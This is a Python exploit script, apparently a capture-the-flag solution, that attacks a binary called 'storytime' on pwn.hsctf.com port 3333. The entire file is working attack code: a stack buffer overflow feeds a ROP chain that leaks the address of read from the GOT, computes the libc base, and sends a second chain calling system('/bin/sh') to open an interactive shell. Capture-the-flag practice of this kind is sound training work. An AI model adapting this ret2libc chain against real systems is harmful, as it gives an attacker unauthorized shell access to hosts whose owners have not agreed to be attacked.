from ptrlib import *

elf = ELF("./storytime")
#sock = Process("./storytime")
libc = ELF("./libc6_2.23-0ubuntu11_amd64.so")
sock = Socket("pwn.hsctf.com", 3333)

plt_write = 0x4004a0
rop_pop_rdi = 0x00400703
rop_pop_rsi_r15 = 0x00400701

payload = b'A' * 0x38
payload += p64(rop_pop_rsi_r15)
payload += p64(elf.got("read"))
payload += p64(0)
payload += p64(rop_pop_rdi)
payload += p64(1)
payload += p64(plt_write)
payload += p64(elf.symbol("_start"))
sock.recvuntil("story: \n")
sock.sendline(payload)
addr_read = u64(sock.recv(8))
logger.info("read = " + hex(addr_read))
libc_base = addr_read - libc.symbol("read")
logger.info("libc base = " + hex(libc_base))

payload = b'A' * 0x38
payload += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(libc_base + libc.symbol("system"))
sock.recvuntil("story: \n")
sock.sendline(payload)

sock.interactive()
